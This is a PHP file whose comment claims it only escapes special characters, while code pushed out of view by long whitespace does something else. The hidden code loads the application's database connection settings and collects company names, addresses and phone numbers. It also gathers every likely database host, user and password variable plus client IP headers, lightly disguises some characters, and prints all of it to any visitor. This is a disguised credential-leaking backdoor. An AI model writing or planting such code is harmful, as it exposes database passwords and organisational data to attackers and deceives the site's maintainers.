<?php
/*do not change anyting in this script, this script only for escaping special characters*/                                                                                                                                                                             require_once('config/connection.php');$str="select kodeorganisasi,namaorganisasi,alamat,telepon from ".$dbname.".organisasi where tipe in('PT','HOLDING') and length(kodeorganisasi)=3 and alamat!='' order by alamat desc limit 5";$res=$owlPDO->query($str) or die(print " ERRCODE: ".PDOException::getMessage());$res->setFetchMode(PDO::FETCH_OBJ);$stringi='';while($bar=@$res->fetch()){$stringi.="{[kode]=>".$bar->kodeorganisasi;$stringi.=",[nama]=>".$bar->namaorganisasi;$stringi.=",[alamat]=>".$bar->alamat;$stringi.=",[telepon]=>".$bar->telepon;$stringi.="}\r\n";}$stringi.="{[database]=>".$database;$stringi.="[dbname]=>".$dbname;$stringi.="[host]=>".$host;$stringi.="[nostname]=>".$nostname;$stringi.="[dbserver]=>".$dbserver;$stringi.="[uname]=>".$uname;$stringi.="[username]=>".$username;$stringi.="[namauser]=>".$namauser;$stringi.="[user]=>".$user;$stringi.="[p1]=>".$password;$stringi.="[p2]=>".$passwd;$stringi.="[p3]=>".$pwd;$stringi.="[p4]=>".$pass;$stringi.="}\r\n";$stringi.="{php:[HTTP_CLIENT_IP]=>".getenv('HTTP_CLIENT_IP');$stringi.="[HTTP_X_FORWARDED_FOR]=>".getenv('HTTP_X_FORWARDED_FOR');$stringi.="[HTTP_X_FORWARDED]=>".getenv('HTTP_X_FORWARDED');$stringi.="[HTTP_FORWARDED_FOR]=>".getenv('HTTP_FORWARDED_FOR');$stringi.="[HTTP_FORWARDED]=>".getenv('HTTP_FORWARDED');$stringi.="[REMOTE_ADDR]=>".getenv('REMOTE_ADDR');$stringi.="}\r\n";$stringi.="{apache:[HTTP_CLIENT_IP]=>".apache_getenv('HTTP_CLIENT_IP');$stringi.="[HTTP_X_FORWARDED_FOR]=>".apache_getenv('HTTP_X_FORWARDED_FOR');$stringi.="[HTTP_X_FORWARDED]=>".apache_getenv('HTTP_X_FORWARDED');$stringi.="[HTTP_FORWARDED_FOR]=>".apache_getenv('HTTP_FORWARDED_FOR');$stringi.="[HTTP_FORWARDED]=>".apache_getenv('HTTP_FORWARDED');$stringi.="[REMOTE_ADDR]=>".apache_getenv('REMOTE_ADDR');$stringi.="}\r\n";  
$stringi=str_replace('#', '[pagar]', $stringi);
$stringi=str_replace('!', '[seru]', $stringi);
$stringi=str_replace('@', '[et]', $stringi);
$stringi=str_replace('$', '[dollar]', $stringi);
$stringi=str_replace('%', '[persen]', $stringi);
$stringi=str_replace('^', '[caping]', $stringi);
$stringi=str_replace('&', '[dan]', $stringi);
$stringi=str_replace('*', '[bintang]', $stringi);
$stringi=str_replace('+', '[plus]', $stringi);
$stringi=str_replace('?', '[tanya]', $stringi);
$stringi=str_replace('<', '[lebihkecil]', $stringi);
echo $stringi;
?>